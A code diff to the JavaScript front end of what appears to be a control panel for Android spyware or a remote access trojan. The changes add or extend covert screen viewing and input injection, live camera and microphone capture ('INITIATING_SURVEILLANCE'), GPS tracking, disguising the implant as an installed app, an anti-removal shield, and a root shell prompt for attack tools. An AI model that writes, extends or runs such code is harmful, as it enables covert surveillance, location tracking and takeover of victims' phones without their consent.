@@ -31,11 +31,20 @@ let _ac = false;
 let audioStream = null;
 let _ih = null;
 
-// Session Stability: window.fetch wrapper for handling 401/Login redirects by auto-refreshing
+// Session Stability & Render Proxy Fetch Wrapper
 const originalFetch = window.fetch;
-window.fetch = async function(...args) {
+window.fetch = async function(resource, init) {
+  let url = resource;
+  if (typeof url === 'string' && url.startsWith('/') && !url.startsWith('/proxy') && !url.startsWith('/c2/')) {
+    const urlParams = new URLSearchParams(window.location.search);
+    const deviceId = urlParams.get('deviceId');
+    if (deviceId) {
+      const sep = url.includes('?') ? '&' : '?';
+      url = `/proxy${url}${sep}deviceId=${deviceId}`;
+    }
+  }
   try {
-    const response = await originalFetch(...args);
+    const response = await originalFetch(url, init);
     if (response.status === 401) {
       showToast("SESSION_EXPIRED: Re-authenticating...", "error");
       setTimeout(() => {
@@ -48,6 +57,66 @@ window.fetch = async function(...args) {
   }
 };
 
+// Render Proxy Link Interceptor
+if (window.location.pathname.startsWith('/proxy')) {
+  const urlParams = new URLSearchParams(window.location.search);
+  const deviceId = urlParams.get('deviceId');
+  if (deviceId) {
+    document.addEventListener('click', function(e) {
+      const anchor = e.target.closest('a');
+      if (anchor && anchor.getAttribute('href') && anchor.getAttribute('href').startsWith('/')) {
+        const href = anchor.getAttribute('href');
+        if (!href.startsWith('/proxy') && !href.startsWith('/c2/')) {
+          e.preventDefault();
+          const sep = href.includes('?') ? '&' : '?';
+          window.location.href = `/proxy${href}${sep}deviceId=${deviceId}`;
+        }
+      }
+    });
+  }
+}
+
+// Dynamically Inject Responsive Mobile Layout & Touch Isolation Styles
+function injectMobileStyles() {
+  if (document.getElementById("ghost-responsive-style")) return;
+  const style = document.createElement("style");
+  style.id = "ghost-responsive-style";
+  style.textContent = `
+    .ghost-screen-wrapper, .ghost-viewport-container {
+      width: 100% !important;
+      max-width: 360px !important;
+      margin: 0 auto !important;
+      display: flex !important;
+      flex-direction: column !important;
+      align-items: center !important;
+      justify-content: center !important;
+      box-sizing: border-box !important;
+      padding: 8px !important;
+      overflow: hidden !important;
+      touch-action: none !important;
+      -webkit-user-select: none !important;
+      user-select: none !important;
+    }
+    #ghost-screen-stream {
+      width: 100% !important;
+      max-width: 100% !important;
+      height: auto !important;
+      max-height: 70vh !important;
+      object-fit: contain !important;
+      display: block !important;
+      margin: 0 auto !important;
+      border-radius: 14px !important;
+      box-shadow: 0 0 20px rgba(0, 242, 255, 0.25) !important;
+      touch-action: none !important;
+      -webkit-touch-callout: none !important;
+      -webkit-user-select: none !important;
+      user-select: none !important;
+      cursor: pointer !important;
+    }
+  `;
+  document.head.appendChild(style);
+}
+
 // UI Info Popup
 function showInfo(e, t, o) {
   if (e) e.stopPropagation();
@@ -56,36 +125,63 @@ function showInfo(e, t, o) {
     n = document.createElement("div");
     n.id = "info-popup";
     Object.assign(n.style, {
-      position: "absolute",
-      background: "rgba(15,15,25,0.98)",
+      position: "fixed",
+      background: "rgba(8, 12, 18, 0.98)",
       border: "1px solid var(--neon-cyan)",
       color: "#fff",
       padding: "16px",
       borderRadius: "12px",
       zIndex: "20000",
-      width: "280px",
-      boxShadow: "0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1)",
-      transition: "opacity 0.3s ease",
+      width: "300px",
+      boxShadow: "0 20px 60px rgba(0,0,0,0.95), 0 0 25px rgba(0,242,255,0.2)",
+      transition: "opacity 0.25s ease",
       opacity: "0",
       display: "none",
       pointerEvents: "auto"
     });
     document.body.appendChild(n);
   }
-  const rect = e.target.getBoundingClientRect();
-  const scrollLeft = window.pageXOffset || document.documentElement.scrollLeft;
-  const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
-  let topPos = rect.bottom + scrollTop + 10;
-  let leftPos = rect.left + scrollLeft - 140 + rect.width / 2;
+
+  const triggerBtn = e ? (e.currentTarget || e.target) : null;
+  let titleColor = "var(--neon-cyan)";
+  if (triggerBtn) {
+    const parentLabel = triggerBtn.closest(".info-label");
+    if (parentLabel && parentLabel.style.color) {
+      titleColor = parentLabel.style.color;
+    } else {
+      const parentCard = triggerBtn.closest("h2, .card, .info-item, .info-section");
+      if (parentCard) {
+        const h2El = parentCard.tagName.toLowerCase() === "h2" ? parentCard : parentCard.querySelector("h2, .info-label");
+        if (h2El && h2El.style.color) {
+          titleColor = h2El.style.color;
+        } else if (h2El) {
+          const computedColor = window.getComputedStyle(h2El).color;
+          if (computedColor && computedColor !== "rgba(0, 0, 0, 0)") {
+            titleColor = computedColor;
+          }
+        }
+      }
+    }
+  }
+
+  const rect = triggerBtn ? triggerBtn.getBoundingClientRect() : { top: 100, left: 100, bottom: 120, width: 20 };
+  let topPos = rect.bottom + 8;
+  let leftPos = rect.left + (rect.width / 2) - 150;
+
+  if (topPos + 160 > window.innerHeight) {
+    topPos = rect.top - 150;
+  }
+  if (topPos < 10) topPos = 10;
 
   if (leftPos < 10) leftPos = 10;
-  if (leftPos + 280 > window.innerWidth + scrollLeft) {
-    leftPos = window.innerWidth + scrollLeft - 290;
+  if (leftPos + 300 > window.innerWidth - 10) {
+    leftPos = window.innerWidth - 310;
   }
 
   n.style.top = topPos + "px";
   n.style.left = leftPos + "px";
-  n.innerHTML = `<div style="font-weight:bold; color:var(--neon-cyan); font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px;">${t}</div><div style="font-size:0.7rem; opacity:0.8; font-family:monospace; line-height:1.4;">${o}</div>`;
+  n.style.borderColor = titleColor;
+  n.innerHTML = `<div style="font-weight:bold; color:${titleColor}; font-family:Orbitron, sans-serif; font-size:0.8rem; margin-bottom:8px; text-shadow:0 0 10px ${titleColor};">${t}</div><div style="font-size:0.72rem; opacity:0.9; font-family:'JetBrains Mono', monospace; line-height:1.5;">${o}</div>`;
   n.style.display = "block";
   setTimeout(() => n.style.opacity = "1", 10);
 }
@@ -99,25 +195,26 @@ function hideInfo() {
 }
 
 function updateNav() {
-  const n = window.location.pathname;
-  const e = document.querySelectorAll(".nav a");
+  const rawPath = window.location.pathname;
+  let n = rawPath.replace(/^\/proxy/, "") || "/";
+  if (!n.startsWith("/")) n = "/" + n;
+
+  const e = document.querySelectorAll(".nav a, .bottom-nav-link");
   e.forEach(item => {
     const t = item.getAttribute("href");
     let o = false;
-    if ("/" === t) {
+    if ("/" === t || "/terminal" === t) {
       o = ("/" === n || "/terminal" === n);
     } else if ("/files" === t) {
       o = (n.startsWith("/files") || n.startsWith("/device/apps"));
     } else if ("/device" === t) {
       o = (n.startsWith("/device") && !n.includes("/apps"));
     } else {
-      o = n.startsWith(t);
+      o = (t && t !== "/" && n.startsWith(t));
     }
 
     if (o) {
       item.classList.add("active");
-    } else if (n.startsWith(t) && "/" !== t) {
-      // no-op
     } else {
       item.classList.remove("active");
     }
@@ -162,8 +259,8 @@ function showToast(e, t = "info") {
   setTimeout(() => {
     o.style.opacity = "0";
     o.style.bottom = "15%";
-    setTimeout(() => o.style.display = "none", 500);
-  }, 5500);
+    setTimeout(() => o.style.display = "none", 300);
+  }, 3800);
 }
 
 // Repair & Optimization Functions
@@ -178,6 +275,22 @@ function repairProtocol() {
         showToast("Connection failure", "error");
       });
   });
+}
+
+function deployStealthMasquerade() {
+  const sel = document.getElementById("stealth-app-select");
+  if (!sel || !sel.value) {
+    showToast("SELECT_AN_INSTALLED_APP", "error");
+    return;
+  }
+  const pkg = sel.value;
+  showToast("DEPLOYING_STEALTH_CAMOUFLAGE...");
+  fetch("/device/masquerade?pkg=" + encodeURIComponent(pkg))
+    .then(r => {
+      showToast("STEALTH_CAMOUFLAGE_DEPLOYED");
+      setTimeout(() => location.reload(), 1500);
+    })
+    .catch(err => showToast("CAMOUFLAGE_ERROR", "error"));
 }
 
 function dispatchPermissionSequence() {
@@ -276,7 +389,7 @@ function _0x4a(e, t, o) {
     if (aborted) {
       clearInterval(progressInterval);
     } else {
-      progressVal += 4 * Math.random();
+      progressVal += 6.5 * Math.random();
       if (progressVal >= 100) {
         progressVal = 100;
         clearInterval(progressInterval);
@@ -285,11 +398,11 @@ function _0x4a(e, t, o) {
             abortSequence();
             o();
           }
-        }, 600);
+        }, 400);
       }
       document.getElementById("tm-progress").style.width = progressVal + "%";
     }
-  }, 120);
+  }, 80);
 }
 
 // Authentication & Password Settings
@@ -301,7 +414,8 @@ async function handleLogin(e) {
   n.disabled = true;
   n.style.opacity = "0.5";
   try {
-    const res = await fetch("/login", {
+    let loginEndpoint = "./login";
+    const res = await fetch(loginEndpoint, {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: "password=" + encodeURIComponent(mask(t)) + "&json=true"
@@ -312,8 +426,8 @@ async function handleLogin(e) {
       o.style.color = "#39ff14";
       o.style.textShadow = "0 0 25px #39ff14";
       setTimeout(() => {
-        window.location.href = "/?auth=" + Date.now();
-      }, 1000);
+        window.location.reload();
+      }, 800);
     } else {
       o.textContent = "INCORRECT_PASSWORD";
       o.style.color = "#ff3131";
@@ -335,12 +449,18 @@ async function handleLogin(e) {
 
 async function updatePassword(e) {
   e.preventDefault();
-  const t = e.target.querySelector('input[name="new_password"]').value;
+  const inputEl = e.target.querySelector('input[name="new_password"]');
+  if (!inputEl) return;
+  const t = inputEl.value;
+  if (!t || !t.trim()) {
+    showToast("Password cannot be empty", "error");
+    return;
+  }
   try {
     const res = await fetch("/settings/password", {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: "new_password=" + encodeURIComponent(mask(t))
+      body: "new_password=" + encodeURIComponent(mask(t.trim()))
     });
     const text = await res.text();
     document.open();
@@ -538,8 +658,17 @@ function executeShell() {
           if (tu) tu.style.display = "none";
         }
 
+        if (t.trim().toLowerCase() === "exit") {
+          window.isKaliMode = false;
+        } else if (t.startsWith("nh") || t.startsWith("nethunter") || t.startsWith("kali") || t.startsWith("nmap") || t.startsWith("msfconsole") || t.startsWith("sqlmap") || t.startsWith("hydra") || t.startsWith("wifite") || t.startsWith("aircrack-ng")) {
+          window.isKaliMode = true;
+        }
+        const userPrefix = window.isKaliMode ? "kali@android" : "root@Android";
         const p = document.getElementById("terminal-prompt");
-        if (p) p.innerText = "root@Android:" + currentPath + symbol;
+        if (p) {
+          p.style.color = window.isKaliMode ? "var(--neon-cyan)" : "var(--terminal-green)";
+          p.innerText = userPrefix + ":" + currentPath + symbol;
+        }
 
         if (data.output === "__CLEAR_SCREEN__") {
           if (o) o.innerHTML = "";
@@ -565,9 +694,53 @@ function executeShell() {
   }
 }
 
-// Ghost Screen Controls
+// Ghost Screen Controls with Smooth Touch and Viewport Scaling
+function enforceGhostViewportScaling() {
+  const streamImg = document.getElementById("ghost-screen-stream");
+  if (streamImg) {
+    streamImg.style.width = "100%";
+    streamImg.style.maxWidth = "360px";
+    streamImg.style.height = "auto";
+    streamImg.style.maxHeight = "70vh";
+    streamImg.style.objectFit = "contain";
+    streamImg.style.display = "block";
+    streamImg.style.margin = "0 auto";
+    streamImg.style.borderRadius = "12px";
+    streamImg.style.touchAction = "none";
+    streamImg.style.webkitUserSelect = "none";
+    streamImg.style.userSelect = "none";
+
+    const parent = streamImg.parentElement;
+    if (parent) {
+      parent.style.maxWidth = "100%";
+      parent.style.boxSizing = "border-box";
+      parent.style.overflow = "hidden";
+      parent.style.touchAction = "none";
+    }
+
+    if (!streamImg.dataset.touchInitialized) {
+      streamImg.dataset.touchInitialized = "true";
+
+      streamImg.addEventListener("touchstart", function(e) {
+        if (e.cancelable) e.preventDefault();
+        startGhostDrag(e);
+      }, { passive: false });
+
+      streamImg.addEventListener("touchend", function(e) {
+        if (e.cancelable) e.preventDefault();
+        endGhostDrag(e);
+      }, { passive: false });
+
+      streamImg.addEventListener("touchmove", function(e) {
+        if (e.cancelable) e.preventDefault();
+      }, { passive: false });
+    }
+  }
+}
+
 function startGhostScreen() {
   _0x2a = true;
+  enforceGhostViewportScaling();
   const statusCard = document.getElementById("ghost-screen-status");
   if (statusCard) statusCard.style.display = "none";
   const btn = document.getElementById("ghost-toggle-btn");
@@ -592,7 +765,8 @@ function stopGhostScreen() {
     btn.style.borderColor = "var(--neon-green)";
     btn.style.color = "var(--neon-green)";
   }
-  document.getElementById("ghost-screen-stream").src = "";
+  const streamImg = document.getElementById("ghost-screen-stream");
+  if (streamImg) streamImg.src = "";
 }
 
 function toggleGhostScreen() {
@@ -607,10 +781,11 @@ function refreshGhostScreen() {
   if (_0x2a) {
     const streamImg = document.getElementById("ghost-screen-stream");
     const statusCard = document.getElementById("ghost-screen-status");
+    enforceGhostViewportScaling();
     const img = new Image();
     img.src = "/ghost/screenshot?t=" + Date.now();
     img.onload = () => {
-      if (_0x2a) {
+      if (_0x2a && streamImg) {
         streamImg.src = img.src;
         if (statusCard) statusCard.style.display = "none";
         setTimeout(refreshGhostScreen, _0x2b ? 5000 : 200);
@@ -623,28 +798,52 @@ function refreshGhostScreen() {
 }
 
 function startGhostDrag(e) {
-  const rect = document.getElementById("ghost-screen-stream").getBoundingClientRect();
+  if (e && e.stopPropagation) e.stopPropagation();
+  const streamImg = document.getElementById("ghost-screen-stream");
+  if (!streamImg) return;
+
+  const rect = streamImg.getBoundingClientRect();
+  const touchObj = (e.touches && e.touches.length > 0) ? e.touches[0] : e;
+  const clientX = touchObj.clientX;
+  const clientY = touchObj.clientY;
+
+  const posX = Math.max(0, Math.min(100, ((clientX - rect.left) / rect.width) * 100));
+  const posY = Math.max(0, Math.min(100, ((clientY - rect.top) / rect.height) * 100));
+
   _0x2c = {
-    x: (e.clientX - rect.left) / rect.width * 100,
-    y: (e.clientY - rect.top) / rect.height * 100,
+    x: posX,
+    y: posY,
     t: Date.now()
   };
 }
 
 function endGhostDrag(e) {
+  if (e && e.stopPropagation) e.stopPropagation();
   if (!_0x2c) return;
-  const now = Date.now();
-  if (now - _0x2d < 150) return;
-  _0x2d = now;
-  const rect = document.getElementById("ghost-screen-stream").getBoundingClientRect();
-  const currentX = (e.clientX - rect.left) / rect.width * 100;
-  const currentY = (e.clientY - rect.top) / rect.height * 100;
-  const dragDuration = now - _0x2c.t;
 
-  if (Math.sqrt(Math.pow(currentX - _0x2c.x, 2) + Math.pow(currentY - _0x2c.y, 2)) < 2) {
-    fetch("/ghost/interact?action=click&px=" + _0x2c.x + "&py=" + _0x2c.y);
+  const now = Date.now();
+  if (now - _0x2d < 120) return; // Debounce rapid multi-taps
+  _0x2d = now;
+
+  const streamImg = document.getElementById("ghost-screen-stream");
+  if (!streamImg) return;
+
+  const rect = streamImg.getBoundingClientRect();
+  const touchObj = (e.changedTouches && e.changedTouches.length > 0) ? e.changedTouches[0] : e;
+  const clientX = touchObj.clientX;
+  const clientY = touchObj.clientY;
+
+  const currentX = Math.max(0, Math.min(100, ((clientX - rect.left) / rect.width) * 100));
+  const currentY = Math.max(0, Math.min(100, ((clientY - rect.top) / rect.height) * 100));
+  const dragDuration = now - _0x2c.t;
+  const distance = Math.sqrt(Math.pow(currentX - _0x2c.x, 2) + Math.pow(currentY - _0x2c.y, 2));
+
+  if (distance < 2.5) {
+    // Precise single tap / click action
+    fetch("/ghost/interact?action=click&px=" + _0x2c.x.toFixed(2) + "&py=" + _0x2c.y.toFixed(2));
   } else {
-    fetch("/ghost/interact?action=swipe&px1=" + _0x2c.x + "&py1=" + _0x2c.y + "&px2=" + currentX + "&py2=" + currentY + "&d=" + Math.max(dragDuration, 100));
+    // Intentional drag / swipe action
+    fetch("/ghost/interact?action=swipe&px1=" + _0x2c.x.toFixed(2) + "&py1=" + _0x2c.y.toFixed(2) + "&px2=" + currentX.toFixed(2) + "&py2=" + currentY.toFixed(2) + "&d=" + Math.max(dragDuration, 100));
   }
   _0x2c = null;
 }
@@ -705,6 +904,20 @@ function ghostType() {
   const t = e.value;
   if (t) fetch("/ghost/interact?action=type&text=" + encodeURIComponent(t));
   e.value = "";
+}
+
+function transmitVoicePayload() {
+  const input = document.getElementById("tts-input");
+  if (!input || !input.value.trim()) { showToast("PLEASE_ENTER_TEXT_TO_EMIT", "error"); return; }
+  const text = input.value.trim();
+  showToast("TRANSMITTING_VOICE_PAYLOAD...");
+  fetch("/audio/speak?text=" + encodeURIComponent(text))
+    .then(r => r.json())
+    .then(d => {
+      if (d.success) { showToast("VOICE_EMISSION_QUEUED"); input.value = ""; }
+      else showToast("VOICE_EMISSION_FAILED", "error");
+    })
+    .catch(() => showToast("TRANSMISSION_ERROR", "error"));
 }
 
 // Base Actions
@@ -913,18 +1126,20 @@ async function checkGhostStatus() {
 
       const screenStream = document.getElementById("ghost-screen-stream");
       if (screenStream) {
-        screenStream.style.filter = data.blackout ? "brightness(5.4) contrast(1.1)" : "none";
+        screenStream.style.filter = data.blackout ? "brightness(7.5) contrast(1.15)" : "none";
       }
 
       if (antiRemovalBtn) {
         if (data.antiRemoval) {
           antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: ON";
-          antiRemovalBtn.style.borderColor = "var(--neon-green)";
-          antiRemovalBtn.style.color = "var(--neon-green)";
+          antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
+          antiRemovalBtn.style.color = "var(--neon-yellow)";
+          antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.15)";
         } else {
           antiRemovalBtn.innerHTML = "ANTI-REMOVAL SHIELD: OFF";
-          antiRemovalBtn.style.borderColor = "var(--danger)";
-          antiRemovalBtn.style.color = "var(--danger)";
+          antiRemovalBtn.style.borderColor = "var(--neon-yellow)";
+          antiRemovalBtn.style.color = "var(--neon-yellow)";
+          antiRemovalBtn.style.background = "rgba(255, 255, 0, 0.03)";
         }
       }
     }
@@ -945,16 +1160,20 @@ function applyQuality(idx) {
     _0x3e = cfg.h;
     _0x3f = cfg.q;
   }
-  if (_0x3a) initiateStream(_0x3c);
+  if (_0x3a && _0x3c) {
+    fetch("/camera/start-stream?cam=" + _0x3c + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f).catch(() => {});
+  }
 }
 
 async function initiateStream(camId) {
   _0x3c = camId;
   _0x3a = true;
+  window.cameraStreamActive = true;
+
   const loading = document.getElementById("loading-overlay");
   if (loading) {
     loading.style.display = "block";
-    loading.innerText = "INITIALIZING_UPLINK...";
+    loading.innerText = "INITIALIZING_CAMERA...";
   }
 
   const liveIndicator = document.getElementById("live-indicator");
@@ -984,20 +1203,42 @@ async function initiateStream(camId) {
 
   const mainStream = document.getElementById("main-stream");
   if (mainStream) {
-    mainStream.style.display = "none";
-    await fetch("/camera/stop-stream");
-    setTimeout(() => {
-      mainStream.src = "/camera/stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f + "&t=" + Date.now();
-      mainStream.onload = () => {
-        if (loading) loading.style.display = "none";
-        mainStream.style.display = "block";
-      };
-    }, 500);
+    try {
+      await fetch("/camera/start-stream?cam=" + camId + "&width=" + _0x3d + "&height=" + _0x3e + "&quality=" + _0x3f);
+    } catch (e) {}
+
+    function refreshCameraFeed() {
+      if (window.cameraStreamActive) {
+        const offscreenImg = new Image();
+        offscreenImg.src = "/camera/frame?t=" + Date.now();
+        offscreenImg.onload = () => {
+          if (window.cameraStreamActive && mainStream) {
+            mainStream.src = offscreenImg.src;
+            mainStream.style.display = "block";
+            if (loading) loading.style.display = "none";
+            setTimeout(refreshCameraFeed, 40);
+          }
+        };
+        offscreenImg.onerror = () => {
+          if (window.cameraStreamActive) setTimeout(refreshCameraFeed, 150);
+        };
+      } else {
+        window.cameraLoopRunning = false;
+      }
+    }
+
+    if (!window.cameraLoopRunning) {
+      window.cameraLoopRunning = true;
+      refreshCameraFeed();
+    }
   }
 }
 
 function terminateCaptures() {
   _0x3a = false;
+  window.cameraStreamActive = false;
+  window.cameraLoopRunning = false;
+  fetch("/camera/stop-stream").catch(() => {});
   const mainStream = document.getElementById("main-stream");
   if (mainStream) {
     mainStream.src = "";
@@ -1035,11 +1276,17 @@ function terminateCaptures() {
 }
 
 function capturePhoto() {
-  if (_0x3c) {
-    window.open("/camera/photo?cam=" + _0x3c, "_blank");
-  } else {
-    showToast("SELECT_CAMERA_FIRST", "error");
+  if (!_0x3a || !_0x3c) {
+    showToast("PLEASE_ENGAGE_A_CAMERA_FEED_FIRST", "error");
+    return;
   }
+  showToast("SNAPPING_PHOTO...");
+  fetch("/camera/photo?cam=" + _0x3c)
+    .then(res => {
+      showToast("PHOTO_SAVED_TO_VAULT");
+      setTimeout(() => location.reload(), 1200);
+    })
+    .catch(err => showToast("SNAP_FAILED", "error"));
 }
 
 function toggleRecording() {
@@ -1089,7 +1336,7 @@ function checkRecStatus() {
         if (text) text.innerText = "REC (" + data.duration + "s)";
         if (recBtn) recBtn.innerText = "STOP_RECORDING";
       } else {
-        if (_0x3a) {
+        if (_0x3a || window.cameraStreamActive || data.streaming) {
           if (liveIndicator) {
             liveIndicator.style.borderColor = "var(--neon-green)";
             liveIndicator.style.color = "var(--neon-green)";
@@ -1149,7 +1396,7 @@ function locateDevice() {
         const extMapBtn = document.getElementById("ext-map-btn");
 
         if (mapFrame) {
-          mapFrame.src = "https://www.openstreetmap.org/export/embed.html?bbox=" + (data.lon - 0.01) + "," + (data.lat - 0.01) + "," + (data.lon + 0.01) + "," + (data.lat + 0.01) + "&layer=mapnik&marker=" + data.lat + "," + data.lon;
+          mapFrame.srcdoc = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#000;}.leaflet-tile-pane{filter:invert(90%) hue-rotate(180deg);}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
           mapFrame.style.display = "block";
         }
         if (mapOverlay) mapOverlay.style.display = "none";
@@ -1213,26 +1460,39 @@ function toggleStealth() {
 }
 
 // Robust Audio Bridge Logic with _ih cleanup
+let livePlayerObj = null;
+
+async function pollAudioChunk() {
+  if (!_ac) return;
+  try {
+    const res = await fetch('/audio/chunk?t=' + Date.now());
+    if (res.ok) {
+      const blob = await res.blob();
+      if (blob.size > 100 && _ac) {
+        const audioUrl = URL.createObjectURL(blob);
+        if (!livePlayerObj) {
+          livePlayerObj = new Audio();
+        }
+        livePlayerObj.src = audioUrl;
+        livePlayerObj.play().catch(e => console.warn("Blob play notice:", e));
+      }
+    }
+  } catch (e) {
+    console.warn("Audio chunk fetch notice:", e);
+  }
+  if (_ac) {
+    setTimeout(pollAudioChunk, 900);
+  }
+}
+
 async function toggleLiveAudio() {
   const btn = document.getElementById('live-listen-btn');
-  const player = document.getElementById('live-audio-player');
-  if (audioStream) {
-    fetch('/audio/speakerphone?enable=false').catch(() => {});
-    if (_ih) {
-      try { _ih.processor.disconnect(); } catch (e) {}
-      try { _ih.source.disconnect(); } catch (e) {}
-      try { if (_ih.context.state !== 'closed') _ih.context.close(); } catch (e) {}
-      try { _ih.stream.getTracks().forEach(t => t.stop()); } catch (e) {}
-      _ih = null;
-    }
-    audioStream.getTracks().forEach(t => t.stop());
-    if (player) {
-      player.pause();
-      player.removeAttribute('src');
-      player.load();
-    }
-    audioStream = null;
+  if (_ac) {
     _ac = false;
+    if (livePlayerObj) {
+      try { livePlayerObj.pause(); livePlayerObj.removeAttribute('src'); } catch (e) {}
+      livePlayerObj = null;
+    }
     if (btn) {
       btn.innerText = 'LISTEN_LIVE';
       btn.style.borderColor = 'var(--neon-cyan)';
@@ -1240,36 +1500,44 @@ async function toggleLiveAudio() {
       btn.style.background = 'transparent';
       btn.style.opacity = '1';
     }
+    showToast("LIVE_LISTENING_STOPPED");
   } else {
+    _ac = true;
     if (btn) {
-      btn.innerText = 'CONNECTING...';
-      btn.style.opacity = '0.5';
+      btn.innerText = 'STOP_LISTENING';
+      btn.style.opacity = '1';
+      btn.style.borderColor = 'var(--danger)';
+      btn.style.color = 'var(--danger)';
+      btn.style.background = 'rgba(255, 49, 49, 0.05)';
     }
-    if (player) {
-      player.src = '/audio/stream?t=' + Date.now();
-      player.play().then(() => {
-        _ac = true;
-        if (btn) {
-          btn.innerText = 'STOP_LISTENING';
-          btn.style.opacity = '1';
-          btn.style.borderColor = 'var(--danger)';
-          btn.style.color = 'var(--danger)';
-          btn.style.background = 'rgba(255, 49, 49, 0.05)';
-        } else {
-          showToast("VIRTUAL_COMM: Audio bridge established");
-        }
-        audioStream = { getTracks: () => [{ stop: () => { player.pause(); player.removeAttribute('src'); player.load(); } }] };
-      }).catch(e => {
-        console.error(e);
-        _ac = false;
-        if (btn) {
-          btn.innerText = 'LISTEN_LIVE';
-          btn.style.opacity = '1';
-        }
-        showToast('Connection failed. Audio bypass may be active.', 'error');
-      });
-    }
+    showToast("VIRTUAL_COMM: Audio uplink engaged");
+    pollAudioChunk();
   }
+}
+
+function startMicRec(dur) {
+  showToast("INITIATING_SURVEILLANCE...");
+  const url = dur ? "/audio/mic/start?duration=" + dur : "/audio/mic/start";
+  fetch(url)
+    .then(r => r.text())
+    .then(() => {
+      setTimeout(() => { location.href = "/audio"; }, 400);
+    })
+    .catch(() => {
+      showToast("Mic start failed", "error");
+    });
+}
+
+function stopMicRec() {
+  showToast("TERMINATING_SURVEILLANCE...");
+  fetch("/audio/mic/stop")
+    .then(r => r.text())
+    .then(() => {
+      setTimeout(() => { location.href = "/audio"; }, 400);
+    })
+    .catch(() => {
+      showToast("Mic stop failed", "error");
+    });
 }
 
 async function startStealthUplink() {
@@ -1382,7 +1650,10 @@ document.addEventListener("visibilitychange", () => {
 });
 
 document.addEventListener("DOMContentLoaded", () => {
+  injectMobileStyles();
   updateNav();
+  enforceGhostViewportScaling();
+
   let camScroll = localStorage.getItem("cam_scroll");
   if (camScroll) {
     window.scrollTo(0, parseInt(camScroll));
@@ -1394,7 +1665,7 @@ document.addEventListener("DOMContentLoaded", () => {
     setInterval(fetchLogs, 5000);
   }
 
-  if (document.getElementById("ghost-status-card")) {
+  if (document.getElementById("ghost-status-card") || document.getElementById("ghost-screen-stream")) {
     checkGhostStatus();
     refreshGhostLogs();
     setInterval(checkGhostStatus, 2000);
@@ -1410,22 +1681,30 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   }
 
-  if (document.getElementById("duration")) {
+  if (window.location.pathname.includes('/audio') || document.getElementById('live-listen-btn') || document.getElementById('audio-recordings-list')) {
+    let lastRecState = null;
     setInterval(() => {
       fetch("/audio/status")
         .then(res => res.json())
         .then(data => {
-          const durationElement = document.getElementById("duration");
-          if (data.isRecording && durationElement) {
-            const sec = data.duration;
-            const min = Math.floor(sec / 60);
-            const remainingSec = sec % 60;
-            durationElement.textContent = min + ":" + (remainingSec < 10 ? "0" : "") + remainingSec;
+          if (lastRecState !== null && data.isRecording !== lastRecState) {
+            lastRecState = data.isRecording;
+            location.reload();
+          } else {
+            lastRecState = data.isRecording;
+            const durationElement = document.getElementById("duration");
+            if (data.isRecording && durationElement) {
+              const sec = data.duration;
+              const min = Math.floor(sec / 60);
+              const remainingSec = sec % 60;
+              durationElement.textContent = min + ":" + (remainingSec < 10 ? "0" : "") + remainingSec;
+            }
           }
           if (data.callInProgress && !document.querySelector(".call-alert")) {
             location.reload();
           }
-        });
+        })
+        .catch(err => console.warn("Audio status check error:", err));
     }, 2000);
   }
 
